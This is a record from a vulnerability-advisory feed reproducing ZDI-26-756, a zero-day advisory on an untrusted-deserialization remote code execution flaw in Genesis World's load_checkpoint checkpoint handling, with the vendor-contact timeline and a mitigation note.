-9732c422bd52,9732c422bd52,2026-10-13 00:00 UTC,Vulnerabilities & Patching,Check Point,ZDI Published Advisories,Vulnerability Management,Article,ZDI-26-756: (0Day) Genesis World load_checkpoint Deserialization of Untrusted Data Remote Code Execution Vulnerability,http://www.zerodayinitiative.com/advisories/ZDI-26-756/,Interaction with this library is required to exploit this vulnerability but attack vectors may vary depending on the implementation,"Vulnerability Details
-
-This vulnerability allows remote attackers to execute arbitrary code on affected installations of Genesis World. Interaction with this library is required to exploit this vulnerability but attack vectors may vary depending on the implementation.
-
-The specific flaw exists within the processing of checkpoint files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current process.
-
-Additional Details
-
-07/16/26 - ZDI emailed a Genesis World contributor to request a secure channel for vulnerability disclosures07/28/26 - ZDI asked the vendor to update their security policy via a GitHub issue07/28/26 - the vendor closed the issue08/06/26 - ZDI followed up requesting the vendor’s PSIRT contacts 09/11/26 - ZDI notified the vendor of the intention to publish the case as a 0-day advisory
-
--- Mitigation: Given the nature of the vulnerability, the only salient mitigation strategy is to restrict interaction with the product
-
-Disclosure Timeline
-
-2026-09-25 - Vulnerability reported to vendor
-
-2026-10-13 - Coordinated public release of advisory"
